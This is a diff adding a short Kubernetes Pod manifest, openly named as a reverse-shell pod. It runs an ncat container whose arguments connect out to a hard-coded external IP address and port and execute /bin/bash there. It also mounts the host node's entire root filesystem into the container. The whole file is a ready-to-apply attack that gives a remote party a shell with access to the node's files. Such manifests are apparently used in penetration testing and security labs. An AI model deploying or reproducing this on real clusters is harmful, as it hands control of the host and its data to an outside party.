@@ -1,0 +1,19 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: ncat-reverse-shell-pod
+  labels:
+    app: ncat
+spec:
+  containers:
+  - name: ncat-reverse-shell
+    image: raesene/ncat
+    volumeMounts:
+    - mountPath: /host
+      name: hostvolume
+    args: ['13.213.61.25', '8989', '-e', '/bin/bash']
+  volumes:
+  - name: hostvolume
+    hostPath:
+      path: /
+      type: Directory
